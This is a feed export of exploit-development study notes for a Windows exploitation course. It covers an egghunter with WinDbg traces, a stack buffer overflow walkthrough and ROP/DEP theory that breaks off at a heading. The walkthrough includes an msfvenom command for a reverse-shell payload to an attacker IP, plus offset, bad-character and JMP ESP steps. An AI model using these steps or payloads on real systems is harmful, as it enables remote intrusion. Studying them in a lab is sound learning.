</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; ret ;&#34;</span>  
</span></span><span style="display:flex;"><span>)  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize engine in 32bit mode  </span>
</span></span><span style="display:flex;"><span>ks <span style="color:#f92672">=</span> Ks(KS_ARCH_X86, KS_MODE_32)  
</span></span><span style="display:flex;"><span>encoding, count <span style="color:#f92672">=</span> ks<span style="color:#f92672">.</span>asm(CODE)  
</span></span><span style="display:flex;"><span>egghunter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> dec <span style="color:#f92672">in</span> encoding:  
</span></span><span style="display:flex;"><span> egghunter <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x</span><span style="color:#e6db74">{0:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(int(dec))<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;egghunter = (</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> egghunter <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)&#34;</span>)
</span></span></code></pre></div><p>After checking no null bytes, append the egghunter instead of the classical egghunter and send the exploit. You should get a reverse shell:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">99000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">022</span>dff60
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">022e0000</span>
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">022</span>dc000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">99000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000012e0</span> . <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">904</span>
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0038f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// NO CUSTOM HANDLERS. EXCEPTION GOING TO BE HANDLED WITH DEFAULT HANDLER.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">022</span>dff60
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0x022dffcc</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x77ae8b10</span>     _EXCEPTION_DISPOSITION  ntdll<span style="color:#f92672">!</span>_except_handler4<span style="color:#f92672">+</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span><span style="color:#ae81ff">9</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">12e0.1</span>d20)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">74303077</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000004</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000002</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ae2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b5868 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000004</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz na po nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010202</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 f3af            repe scas dword ptr es:[edi]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">!</span>teb
</span></span><span style="display:flex;"><span>TEB at <span style="color:#ae81ff">003</span><span style="color:#ae81ff">94000</span>
</span></span><span style="display:flex;"><span>    ExceptionList:        <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c
</span></span><span style="display:flex;"><span>    StackBase:            <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac2
</span></span><span style="display:flex;"><span>    StackLimit:           <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>c000
</span></span><span style="display:flex;"><span>    SubSystemTib:         <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    FiberData:            <span style="color:#ae81ff">00001e00</span>
</span></span><span style="display:flex;"><span>    ArbitraryUserPointer: <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Self:                 <span style="color:#ae81ff">003</span><span style="color:#ae81ff">94000</span>
</span></span><span style="display:flex;"><span>    EnvironmentPointer:   <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    ClientId:             <span style="color:#ae81ff">000012e0</span> . <span style="color:#ae81ff">00001</span>d20
</span></span><span style="display:flex;"><span>    RpcHandle:            <span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>    Tls Storage:          <span style="color:#ae81ff">0064</span>a0e0
</span></span><span style="display:flex;"><span>    PEB Address:          <span style="color:#ae81ff">0038f</span><span style="color:#ae81ff">000</span>
</span></span><span style="display:flex;"><span>    LastErrorValue:       <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    LastStatusValue:      c000000d
</span></span><span style="display:flex;"><span>    Count Owned Locks:    <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    HardErrorMode:        <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> dt _EXCEPTION_REGISTRATION_RECORD <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>_EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x000</span> Next             : <span style="color:#ae81ff">0xffffffff</span> _EXCEPTION_REGISTRATION_RECORD
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">+</span><span style="color:#ae81ff">0x004</span> Handler          : <span style="color:#ae81ff">0x04f1eac6</span>     _EXCEPTION_DISPOSITION  <span style="color:#f92672">+</span><span style="color:#ae81ff">4f</span><span style="color:#ae81ff">1</span>eac6
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> BP <span style="color:#ae81ff">0x04f1eac6</span>     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">1</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>c0 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>e0 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 <span style="color:#ae81ff">6</span>a0c            push    <span style="color:#ae81ff">0</span>Ch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> u eip L10
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac6 <span style="color:#ae81ff">6</span>a0c            push    <span style="color:#ae81ff">0</span>Ch
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac8 <span style="color:#ae81ff">59</span>              pop     ecx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eac9 <span style="color:#ae81ff">8</span>b040c          mov     eax,dword ptr [esp<span style="color:#f92672">+</span>ecx]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eacc b1b8            mov     cl,<span style="color:#ae81ff">0</span>B8h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eace <span style="color:#ae81ff">83040806</span>        add     dword ptr [eax<span style="color:#f92672">+</span>ecx],<span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead2 <span style="color:#ae81ff">58</span>              pop     eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead3 <span style="color:#ae81ff">83</span>c410          add     esp,<span style="color:#ae81ff">10</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead6 <span style="color:#ae81ff">50</span>              push    eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead7 <span style="color:#ae81ff">31</span>c0            xor     eax,eax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 c3              ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> bp <span style="color:#ae81ff">0x04f1ead9</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> g
</span></span><span style="display:flex;"><span>Breakpoint <span style="color:#ae81ff">2</span> hit
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">000000</span>b8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>d0 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>e0 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 c3              ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> u <span style="color:#ae81ff">04f1e4</span>d0 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d0 <span style="color:#ae81ff">52</span>              push    edx
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d1 <span style="color:#ae81ff">62</span>af771ceaf1    bound   ebp,qword ptr [edi<span style="color:#f92672">-</span><span style="color:#ae81ff">0E15</span>E389h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d7 <span style="color:#ae81ff">0470</span>            add     al,<span style="color:#ae81ff">70</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>d9 <span style="color:#ae81ff">62</span>af771ceaf1    bound   ebp,qword ptr [edi<span style="color:#f92672">-</span><span style="color:#ae81ff">0E15</span>E389h]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>df <span style="color:#ae81ff">04</span>a8            add     al,<span style="color:#ae81ff">0</span>A8h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>e1 e5f1            in      eax,<span style="color:#ae81ff">0F</span><span style="color:#ae81ff">1</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>e3 <span style="color:#ae81ff">0424</span>            add     al,<span style="color:#ae81ff">24</span>h
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f1e4</span>e5 <span style="color:#ae81ff">62</span>af77c0e5f1    bound   ebp,qword ptr [edi<span style="color:#f92672">-</span><span style="color:#ae81ff">0E1</span>A3F89h]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> t
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">000000</span>b8 edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6270 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span> edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00000000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>af6252 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>d4 ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>e0 iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl zr na pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00000246</span>
</span></span><span style="display:flex;"><span>ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">77</span>af6252 <span style="color:#ae81ff">648</span>b2500000000  mov     esp,dword ptr fs:[<span style="color:#ae81ff">0</span>] fs:<span style="color:#ae81ff">003</span>b:<span style="color:#ae81ff">00000000</span><span style="color:#f92672">=</span><span style="color:#ae81ff">04f1e4</span>d4
</span></span><span style="display:flex;"><span>TBD DECIR QUE DESPUES DEL RET NO HEMOS IDO A <span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ead9 SINO A ntdll<span style="color:#f92672">!</span>ExecuteHandler2<span style="color:#f92672">+</span><span style="color:#ae81ff">0x26</span> y que esto acaba volviendo a buscar en nuestra memoria o si encuentra el code nos da la shell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">g</span>
</span></span><span style="display:flex;"><span>(<span style="color:#ae81ff">12e0.1</span>d20)<span style="color:#f92672">:</span> Access violation <span style="color:#f92672">-</span> code <span style="color:#a6e22e">c0000005</span> (first chance)
</span></span><span style="display:flex;"><span>First chance exceptions are reported before any exception handling.
</span></span><span style="display:flex;"><span>This exception may be expected and handled.
</span></span><span style="display:flex;"><span>eax<span style="color:#f92672">=</span><span style="color:#ae81ff">74303077</span> ebx<span style="color:#f92672">=</span><span style="color:#ae81ff">00001000</span> ecx<span style="color:#f92672">=</span><span style="color:#ae81ff">00000002</span> edx<span style="color:#f92672">=</span><span style="color:#ae81ff">77</span>ae2da0 esi<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b5868 edi<span style="color:#f92672">=</span><span style="color:#ae81ff">00001000</span>
</span></span><span style="display:flex;"><span>eip<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 esp<span style="color:#f92672">=</span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>ea1c ebp<span style="color:#f92672">=</span><span style="color:#ae81ff">41414141</span> iopl<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>         nv up ei pl nz ac pe nc
</span></span><span style="display:flex;"><span>cs<span style="color:#f92672">=</span><span style="color:#ae81ff">001</span>b  ss<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  ds<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  es<span style="color:#f92672">=</span><span style="color:#ae81ff">0023</span>  fs<span style="color:#f92672">=</span><span style="color:#ae81ff">003</span>b  gs<span style="color:#f92672">=</span><span style="color:#ae81ff">0000</span>             efl<span style="color:#f92672">=</span><span style="color:#ae81ff">00010216</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04f</span><span style="color:#ae81ff">1</span>eab3 f3af            repe scas dword ptr es:[edi]
</span></span></code></pre></div>]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_overflow_1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_overflow_1/</guid>
      <description><![CDATA[<h1 id="locating-the-crash">Locating the crash</h1>
<p>Generate the pattern with KALI or online.
Put the pattern as payload and detect the offset of the crash.
Once the offset is located, fill with As.</p>
<p>msf-pattern_create -l 2600</p>
<p>When crashing, EIP will have a certain value.
Copy the value to obtain the exact offset:
msf-pattern_offset -l 2600 -q &ldquo;TBD_EIP&rdquo;</p>
<p>NOTE that the offset given by the tool DOES NOT COVER EIP.
You will have to add 4 bytes after that offset to cover EIP.</p>
<p>Once we add the buffer + the offset to cover EIP, it&rsquo;s turn to know where our shellcode is stored. Let&rsquo;s put some Cs, and see where ESP points:
dds esp
dds esp-4
dds esp-8
dds esp-10
Until we don&rsquo;t see CS:
<img src="content/images/post_images/osed_1.png" alt=""></p>
<p>We know esp-8, then 8. We check it
<img src="content/images/post_images/osed_1_1.png" alt="">
Now badchars.</p>
<pre tabindex="0"><code>badchars = ( b&#34;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&#34; b&#34;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&#34; b&#34;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&#34; b&#34;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&#34; b&#34;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&#34; b&#34;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&#34; b&#34;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&#34; b&#34;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&#34; b&#34;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&#34; b&#34;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&#34; b&#34;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&#34; b&#34;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&#34; b&#34;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&#34; b&#34;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&#34; b&#34;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&#34; b&#34;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#34;)
</code></pre><p>db esp Lff to show all the bytes and see if any is affected:
<img src="content/images/post_images/osed_1_2.png" alt="">
Delete badchars if applicable. See if any of them is missing and repeat the step.</p>
<p>Now we have to find a JMP ESP ADDRESS in any DLL. Remember:</p>
<ul>
<li>That address must not contain badchars -&gt;</li>
<li>The JMP ESP must not be in a read only section. If the DLL has DEP, .data is executable and we can use that address.</li>
</ul>
<p>We want the opcode of the JMP ESP instruction.
In KALI, execute msf-nasm_shell and introduce jmp esp.
The value is FFE4</p>
<p>Then we see all modules with lmD
and then we get our module with lm m &ldquo;TBD_module_name&rdquo;
We should see the start and end address and confirm there are no badchars(remember, zeros are only bad at left)</p>
<p>Then we search for the FFE4 (JMP ESP) instruction in that range:
s -b START END 0xff 0xe4</p>
<p>If we get an ocurrence, we confirm that the address does not contain badchars:
<img src="content/images/post_images/osed_1_4.png" alt=""></p>
<p>EIP will have to point to that address. Remember to put the address in little endian:
eip = b&quot;\xcf\x10\x80\x14&quot; # 0x148010cf</p>
<p><img src="content/images/post_images/osed_1_5.png" alt=""></p>
<p>Generate msfvenom payload with badchars:</p>
<pre tabindex="0"><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python –e x86/shikata_ga_nai -b &#34;\x00\x0a\x0d\x25\x26\x2b\x3d&#34;
</code></pre><p>Note that you can put the EXITFUNC=thread parameter so that only exits the thread and not the whole program when the shellcode is executed.</p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title></title>
      <link>http://localhost:1313/posts/osed_rop_1/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>http://localhost:1313/posts/osed_rop_1/</guid>
      <description><![CDATA[<h1 id="rop-lore">ROP Lore</h1>
<h2 id="why-is-rop-needed">Why is ROP needed</h2>
<p>The classic buffer overflows manage to execute arbitrary code by redirecting the execution flow to <strong>something in the stack (that is normally also user-controlled)</strong>.
However, the normal program flow does <strong>not need to redirect the execution flow of the stack as the code that is being executed is normally</strong> in the .text section of the binary. The stack is used to store and manage local variables and parameters to functions.</p>
<h2 id="distinction-between-codedata-regions">Distinction between code/data regions</h2>
<p>So in order to avoid the classic buffer overflow, the operating system marks the pages of memory of the stack as non-executable, modifying the NX bit of the CPU. The kernel sets the NX bit when the OS maps a memory page.
If an application attempts to execute code from a data page that is protected (NX bit), a memory access violation exception occurs, and if the exception is not handled, the calling process is terminated.
<strong>Note: normally, DEP and NX is disabled at OS level but some BIOS allows disabling the bit directly in the BIOS config</strong>. This is so that the CPU does not enforce this security mechanism.</p>
<h2 id="ret2libc-in-linux">Ret2libc in Linux</h2>
<p>Originally, to bypass DEP a jump to the libc function was performed, passing the arguments. You set the arguments in the stack, and call the function you want to execute of the libc, which is executable code.</p>
<p>Over the years, the technique was expanded, and the commonly-used Return Oriented Programming (ROP) method was developed, allowing the user to execute any code routine and not only specific library functions.</p>
<h2 id="old-dep-bypass-by-using-rop-windows">Old DEP bypass by using ROP (Windows)</h2>
<p>Exploit developers first abused the fact that DEP <strong>could</strong> be disabled on a per-process basis in Windows.
Even if DEP was enabled as a &ldquo;AlwaysOn&rdquo; system policy, it could be disabled per process once the process is running.
The idea was to invoke the <code>NtSetInformationProcess</code> API, which resides in a memory region that is already executable. With this, an attacker could disable DEP before executing their shellcode. Therefore, mark the stack as executable again and execute our shellcode in the stack. This works by replacing the commonly-used &ldquo;jump to shellcode&rdquo; for the memory address of NtSetInformationProcess. Additionally, we also have to place the required arguments on the stack as part of the overwrite.
Once the NtSetInformationProcess API finishes, DEP is disabled, and we can jump to our shellcode again. Other attack variations have been widely used in public exploits. One such attack uses the WinExec function to execute commands on the vulnerable system. While this is useful, it is not as effective as having arbitrary shellcode execution.</p>
<p>Now, Windows implements the <strong>Permanent DEP:</strong> any executable linked with the <code>/NXCOMPAT</code> flag is automatically set as <code>OptIn</code>, meaning that it DEP cannot be disabled.
The only option then is to <strong>circumvent the operating system NX checks.</strong></p>
<h1 id="rop-technical-considerations">ROP technical considerations</h1>
